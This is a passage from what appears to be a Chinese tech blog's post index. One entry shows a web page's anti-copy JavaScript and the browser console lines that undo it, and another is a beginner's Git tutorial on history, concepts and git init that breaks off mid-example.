class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/eryadaanfufei"</span>&gt;</span>尔雅<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span> <span class="attr">class</span>=<span class="string">"site-content container clearfix"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"primary"</span> <span class="attr">class</span>=<span class="string">"content-single content-area"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">main</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"site-main"</span> <span class="attr">role</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">article</span> <span class="attr">id</span>=<span class="string">"post-198"</span> <span class="attr">class</span>=<span class="string">"post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"entry-header"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"entry-meta"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"meta-date"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/198.html"</span> <span class="attr">title</span>=<span class="string">"下午10:02"</span> <span class="attr">rel</span>=<span class="string">"bookmark"</span>&gt;</span><span class="tag">&lt;<span class="name">time</span> <span class="attr">class</span>=<span class="string">"entry-date published updated"</span> <span class="attr">datetime</span>=<span class="string">"2019-03-20T22:02:27+00:00"</span>&gt;</span>2019年3月20日<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">class</span>=<span class="string">"meta-author"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"author vcard"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"url fn n"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/author/meng"</span> <span class="attr">title</span>=<span class="string">"View all posts by gebilaowang"</span> <span class="attr">rel</span>=<span class="string">"author"</span>&gt;</span>gebilaowang<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"entry-title"</span>&gt;</span>密码保护：当代中国政府与政治2019<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"entry-footer"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"entry-categories clearfix"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"meta-categories"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/eryadaanfufei"</span> <span class="attr">rel</span>=<span class="string">"category tag"</span>&gt;</span>尔雅<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navigation post-navigation"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-links"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-previous"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/196.html"</span> <span class="attr">rel</span>=<span class="string">"prev"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Previous Post:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>当代中国经济2019修正版<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-next"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/200.html"</span> <span class="attr">rel</span>=<span class="string">"next"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Next Post:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>当政府遇上互联网2019<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"comments"</span> <span class="attr">class</span>=<span class="string">"comments-area"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"secondary"</span> <span class="attr">class</span>=<span class="string">"sidebar widget-area clearfix sidebar-my-flag"</span> <span class="attr">role</span>=<span class="string">"complementary"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">id</span>=<span class="string">"search-6"</span> <span class="attr">class</span>=<span class="string">"widget widget_search clearfix"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"search"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">class</span>=<span class="string">"search-form"</span> <span class="attr">action</span>=<span class="string">"http://www.gebidemengmianren.com/"</span>&gt;</span> <span class="tag">&lt;<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Search for:<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"search-field"</span> <span class="attr">placeholder</span>=<span class="string">"搜索 &amp;hellip;"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"s"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">title</span>=<span class="string">"Search for:"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"search-submit"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"genericon-search"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/question-and-answer"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"livechat-girl animated"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"girl"</span> <span class="attr">src</span>=<span class="string">"http://www.gebidemengmianren.com/kefu/images/en_3.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"rd-notice-content"</span>&gt;</span> 我来帮您！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"animated-circles"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"http://www.xuexianswer.com/kefu/css/css.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"screen"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/kefu/js/kefu.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.gebidemengmianren.com/kefu/js/en_3.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"footer"</span> <span class="attr">class</span>=<span class="string">"footer-wrap"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">footer</span> <span class="attr">id</span>=<span class="string">"colophon"</span> <span class="attr">class</span>=<span class="string">"site-footer container clearfix"</span> <span class="attr">role</span>=<span class="string">"contentinfo"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/"</span> <span class="attr">style</span>=<span class="string">'text-decoration:none; color:#939393;'</span>&gt;</span>&amp;copy;隔壁的萌面人<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.beian.miit.gov.cn/"</span> <span class="attr">style</span>=<span class="string">'text-decoration:none;color:#939393;'</span>&gt;</span>渝ICP备17014860号-2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"display:inline-block;text-decoration:none;height:20px;line-height:20px;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/beian/logo.png"</span> <span class="attr">style</span>=<span class="string">"float:left;"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;"</span>&gt;</span>渝公网安备 50011402500333号<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">style</span>=<span class="string">"display:inline-block;float:right;color:#303030;text-decoration:none;"</span>&gt;</span>友情链接： <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xuexianswer.com/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人资料铺<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.mengmianren.com/"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人网<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://mengmianren.cc/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人CC网<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://mengmianren.pro/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人PRO网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"imagetoolbar"</span> <span class="attr">content</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">if</span> (event.srcElement.type != <span class="string">"text"</span> &amp;&amp; event.srcElement.type != <span class="string">"textarea"</span> &amp;&amp; event.srcElement.type != <span class="string">"password"</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.sidebar) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> obj = e.target;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (obj.tagName.toUpperCase() == <span class="string">'SELECT'</span> ||</span></span><br><span class="line"><span class="actionscript">          obj.tagName.toUpperCase() == <span class="string">"INPUT"</span> ||</span></span><br><span class="line"><span class="actionscript">          obj.tagName.toUpperCase() == <span class="string">"TEXTAREA"</span> ||</span></span><br><span class="line"><span class="actionscript">          obj.tagName.toUpperCase() == <span class="string">"PASSWORD"</span>) &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> pvcArgsFrontend = &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="string">"mode"</span>: <span class="string">"ajax"</span>,</span></span><br><span class="line"><span class="actionscript">      <span class="string">"requestURL"</span>: <span class="string">"http:\/\/www.gebidemengmianren.com\/wp-content\/plugins\/post-views-counter\/includes\/ajax.php"</span>,</span></span><br><span class="line"><span class="actionscript">      <span class="string">"postID"</span>: <span class="string">"198"</span>,</span></span><br><span class="line"><span class="actionscript">      <span class="string">"nonce"</span>: <span class="string">"8b28046242"</span></span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h2 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h2></li></ul><p>查看源码的一个简单方法：</p><p>在浏览器的地址栏输入以下东西，即可查看源码</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">view</span>-<span class="keyword">source</span>:url</span><br></pre></td></tr></table></figure><p>假如是通过js禁用的话，可以在控制台下输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.oncontextmenu=<span class="string">"return true"</span>;</span><br><span class="line"><span class="comment">//右键菜单</span></span><br><span class="line"><span class="built_in">document</span>.body.onselectstart=<span class="string">"return true"</span>;</span><br><span class="line"><span class="comment">//文本选择</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/2019/09/23/git/"/>
      <url>/2019/09/23/git/</url>
      
        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a><center>Git</center></h1><blockquote><p>引用：</p><p><a href="https://blog.csdn.net/tgbus18990140382/article/details/52886786" target="_blank" rel="noopener">Git详细使用教程</a></p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">Git教程</a></p><p><a href="https://blog.csdn.net/yufeng1108/article/details/80619547" target="_blank" rel="noopener">Git本地服务器搭建及使用方法</a></p><p><a href="https://www.wmyskxz.com/2019/08/16/git-yuan-li-ru-men-jian-xi/" target="_blank" rel="noopener">Git原理入门解析</a></p><p><a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看Git</a></p></blockquote><hr><blockquote><p> <strong>Git 的诞生：</strong></p><p>很多人都知道，Linus 在 1991 年创建了开源的 Linux，从此，Linux 系统不断发展，已经成为最大的服务器系统软件了。</p><p>Linus 虽然创建了 Linux，但 Linux 的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为 Linux 编写代码，那 Linux 的代码是如何管理的呢？</p><p>事实是，在 2002 年以前，世界各地的志愿者把源代码文件通过 diff 的方式发给 Linus，然后由 Linus 本人通过手工方式合并代码！</p><p>你也许会想，为什么 Linus 不把 Linux 代码放到版本控制系统里呢？不是有 CVS、SVN 这些免费的版本控制系统吗？因为 Linus 坚定地反对 CVS 和 SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比 CVS、SVN 好用，但那是付费的，和 Linux 的开源精神不符。</p><p>不过，到了 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是 Linus 选择了一个商业的版本控制系统 BitKeeper，BitKeeper 的东家 BitMover 公司出于人道主义精神，授权 Linux 社区免费使用这个版本控制系统。</p><p>安定团结的大好局面在 2005 年就被打破了，原因是 Linux 社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发 Samba 的 Andrew 试图破解 BitKeeper 的协议（这么干的其实也不只他一个），被 BitMover 公司发现了（监控工作做得不错！），于是 BitMover 公司怒了，要收回 Linux 社区的免费使用权。</p><p>Linus 可以向 BitMover 公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是：Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！牛是怎么定义的呢？大家可以体会一下。</p><p>Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。</p><p>历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。</p></blockquote><h2 id="Git是什么"><a href="#Git是什么" class="headerlink" title="Git是什么"></a>Git是什么</h2><p>Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。<br>Git是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。<br>Git与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><p>先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。</p><p>那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，<strong>分布式版本控制系统根本没有 “中央服务器”，每个人的电脑上都是一个完整的版本库，</strong>这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。集中式版本控制系统最大的毛病就是必须联网才能工作。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_1.png" alt></p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_2.png" alt></p><blockquote><p><strong>Git与SVN的区别</strong><br>GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。<br>Git 与 SVN 区别点：</p><ol><li>GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。</li><li>2.GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。</li><li>GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。</li><li>GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。</li><li>GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</li></ol></blockquote><h2 id="Git原理"><a href="#Git原理" class="headerlink" title="Git原理"></a>Git原理</h2><p>详细图文解释可参考此篇文章<a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看Git</a>，里面详细用图文解释了git的版本控制原理</p><p>git的工作流程大概如下：</p><ol><li>克隆 Git 资源作为工作目录。</li><li>在克隆的资源上添加或修改文件。</li><li>如果其他人修改了，你可以更新资源。</li><li>在提交前查看修改。</li><li>提交修改。</li><li>在修改完成后，如果发现错误，可以撤回提交并再次修改并提交。</li></ol><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_3.png" alt></p><p>基本概念<br>我们先来理解下Git 工作区、暂存区和版本库概念</p><ul><li><p>工作区：就是你项目的目录（可见目录）。</p></li><li><p>缓存区：英文叫stage, 或index。一般存放在”git目录”下的index文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。</p></li><li><p>版本库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。</p></li></ul><p>下面这个图展示了工作区、版本库中的暂存区和版本库之间的关系：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="git/git_4.png" alt></p><p>如果我们要对项目进行管理，就切换到该项目目录底下，使用<code>git init</code>命令，进行初始化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> init</span><br></pre></td></tr></table></figure><p><code>git init</code> 命令只会做一件事，就是在项目的根目录下创建一个 <code>.git</code> 的子目录，用来保存当前项目的一些版本信息，我们可以继续使用 <code>tree -a</code> 命令查看该目录的完整结构，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 